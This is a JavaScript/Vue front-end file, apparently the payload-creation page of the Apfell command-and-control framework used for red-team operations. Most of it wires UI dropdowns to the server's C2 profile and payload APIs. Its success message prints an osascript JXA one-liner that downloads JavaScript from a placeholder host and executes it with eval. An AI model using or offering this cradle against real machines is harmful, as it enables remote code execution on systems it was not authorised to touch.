var c2_profile_parameters = []; //all c2 profile parameter data
var payload_parameters = []; //all payload parameter data
var all_c2_data = {};
var username = "{{name}}";
var profile_parameters_table = new Vue({
    el: '#payloadCreation',
    data: {
        c2_profile_parameters,
        payload_parameters
    },
    delimiters: ['[[',']]']
});
$( document ).unbind('ready').ready(function(){
    //initially populate the c2_profiles section with the available c2profiles for this operation
     httpGetAsync("{{http}}://{{links.server_ip}}:{{links.server_port}}{{links.api_base}}/c2profiles/current_operation", c2_profile_callback, "GET", null);
     //this gets a lot of information, including the payload types that are associated with each c2profile, so save that all off so we can update appropriately
});
$( '#c2_profile' ).unbind('change').change(function(){
    if( $('#c2_profile').val() != "Select One"){
        //make a request out to the c2 profile parameters api to get the parameters
        httpGetAsync("{{http}}://{{links.server_ip}}:{{links.server_port}}{{links.api_base}}/c2profiles/" + $('#c2_profile').val() + "/parameters", c2_profile_parameters_callback, "GET", null);
        //now potentially update the payload options section
    }
    else{
        profile_parameters_table.c2_profile_parameters.length = 0;
        Vue.set(profile_parameters_table.c2_profile_parameters, []);
        profile_parameters_table.payload_parameters.length = 0;
        Vue.set(profile_parameters_table.payload_parameters, []);
        $( '#payload_type' ).html('<option value="Select One">Select One...</option>');
        $( '#payload_commands' ).html("");
    }


});
function c2_profile_callback(response){
    // populate the c2_profile select options
    var data = JSON.parse(response);
    var c2_profile_options = '<option value="Select One">Select One...</option>';
    for(var i = 0; i < data.length; i ++){
        c2_profile_options = c2_profile_options + '<option value="' + data[i].name + '">' + data[i].name + '</option>';
        //save all of the information off into the global dictionary that we can reference later.
        all_c2_data[data[i].name] = data[i];
    }
    $( '#c2_profile').html(c2_profile_options);
};
function c2_profile_parameters_callback(response){
    //this is called when the c2_profile dropdown changes and we get results back from the GET request
    var data = JSON.parse(response);
    if(data['status'] == 'success'){
        // populate the table values
        profile_parameters_table.c2_profile_parameters.lenth = 0; //clear all the fields first
        for(var i = 0; i < data['c2profileparameters'].length; i++){
            profile_parameters_table.c2_profile_parameters.push(data['c2profileparameters'][i]);
        }
        // we also need to populate the dropdown for the payload_type side
        profile_parameters_table.payload_parameters.length = 0;
        var c2_profile_val = $('#c2_profile').val();
        var payload_type_options = '<option value="Select One">Select One...</option>';
        for(var i = 0; i < all_c2_data[c2_profile_val]['ptype'].length; i++){
            payload_type_options = payload_type_options + '<option value="' + all_c2_data[c2_profile_val]['ptype'][i] +
            '">' + all_c2_data[c2_profile_val]['ptype'][i] + '</option>';
        }
        $( '#payload_type').html(payload_type_options);
    }
    else{
        alert(data['error']);
    }
};
$( '#payload_type' ).change(function(){
    // when this changes we need to get the available parameters and commands for this payload type
    //do a request to get the commands which will asynchronously populate the '#payload_commands' select multiple field
    httpGetAsync("{{http}}://{{links.server_ip}}:{{links.server_port}}{{links.api_base}}/payloadtypes/" + $('#payload_type').val() + "/commands", commands_callback, "GET", null);
    //do a request to get all the parameters for the payload_type which will populate the 'payload_parameters' variable here

});
function commands_callback(response){
    data = JSON.parse(response);
    cmd_options = '';
    if(data['status'] == 'success'){
        for(var i = 0; i < data['commands'].length; i++){
            cmd_options = cmd_options + '<option value="' + data['commands'][i]['cmd'] + '">' + data['commands'][i]['cmd'] + '</option>';
        }
        $( '#payload_commands' ).html(cmd_options);
    }
};
function submit_payload(){
    console.log("called submit");
    data = {"payload_type": $('#payload_type').val(), "c2_profile": $('#c2_profile').val(),
    "commands": $('#payload_commands').val()};
    if( $('#location').val() != ""){
        data['location'] = $('#location').val();
    }
    if( $('#default_tag').val() != ""){
        data['tag'] = $('#default_tag').val();
    }
    // now get the c2 profile values into a dictionary
    var c2_profile_parameters_dict = {};
    for(var i = 0; i < profile_parameters_table.c2_profile_parameters.length; i++){
        c2_profile_parameters_dict[profile_parameters_table.c2_profile_parameters[i]['name']] = $('#' + profile_parameters_table.c2_profile_parameters[i]['key']).val();
    }
    data['c2_profile_parameters'] = c2_profile_parameters_dict;
    //console.log(data);
    httpGetAsync("{{http}}://{{links.server_ip}}:{{links.server_port}}{{links.api_base}}/payloads/create", submit_payload_callback, "POST", data);
}
function submit_payload_callback(response){
    console.log(response);
    data = JSON.parse(response);
    if(data['status'] == "success"){
        //print out the run usage commands
        if( $('#payload_type').val() == 'apfell-jxa'){
            var execution_string = "Success! YOu can now execute it with a method like the JXA oneliner:<br>";
            execution_string = execution_string + "osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('<b>http://someIPHere:port/output/file/name.js</b>')),$.NSUTF8StringEncoding)));<br>";
            execution_string = execution_string + "be sure to host the file somewhere though like with the <b>Services->Host File</b> section!";
            $('#success').html(execution_string);
        }
    }
    else{
        $('#errors').val((data['error']));
    }
}